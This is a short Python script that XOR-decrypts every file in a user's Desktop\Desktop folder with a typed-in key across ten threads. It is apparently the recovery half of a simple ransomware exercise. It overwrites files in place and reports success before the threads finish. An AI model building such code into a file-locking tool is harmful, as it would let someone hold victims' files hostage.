import os
import threading
import queue


def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypting {file}')
        try:
            keyIndex = 0
            maxKeyIndex = len(key) - 1
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xorByte = byte ^ ord(key[keyIndex])
                with open(file, 'ab') as f:
                    f.write(xorByte.to_bytes(1, 'little'))
                # Increment key index
                if keyIndex >= maxKeyIndex:
                    keyIndex = 0
                else:
                    keyIndex += 1
            print(f'{file} decrypted')
        except:
            print('Unable to decrypt file')
        q.task_done()


# Key information
# lenght of the generated key in bytes
keySize = 32
keyChars = '<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
keyCharLenght = len(keyChars)

# Encryption filepath
print("Preparing files")
encryptionPath = os.environ['USERPROFILE'] + '\\Desktop\\Desktop'
files = os.listdir(encryptionPath)
absFiles = []
for f in files:
    absFiles.append(encryptionPath + '\\' + f)
print("All files located!")

key = input("Enter the key to decrypt the files: ")

# Creates a queue of files to be encrypted
q = queue.Queue()
for f in absFiles:
    q.put(f)

# Setup threads and start them
for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,))
    t.daemon = True
    t.start()

print('Decryption finished!')

input()
